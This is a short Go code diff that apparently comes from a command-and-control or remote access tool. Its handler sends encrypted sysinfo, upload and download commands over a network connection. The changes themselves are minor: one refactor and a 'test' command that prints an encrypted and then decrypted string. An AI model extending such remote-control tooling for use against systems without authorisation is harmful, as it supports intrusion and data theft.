@@ -48,7 +48,9 @@ func sysinfo(conn net.Conn) {
 	enc := gob.NewEncoder(conn)
 	dec := gob.NewDecoder(conn)
 
-	enc.Encode(security.Encrypt("sysinfo"))
+	var encSysinfo = security.Encrypt("sysinfo")
+
+	enc.Encode(encSysinfo)
 
 	result := ""
 	dec.Decode(&result)
@@ -116,6 +118,11 @@ func handleConnection(conn net.Conn) {
 			upload(conn)
 		case c3cmd == "download":
 			download(conn)
+		case c3cmd == "test":
+			var ranString = "Hi how are you"
+			var encRanString = security.Encrypt(ranString)
+			var decRanString = security.Decrypt(encRanString)
+			fmt.Println(decRanString)
 		default:
 			fmt.Println(color.Red + "[ERROR]: " + color.Reset + "Invalid command")
 		}
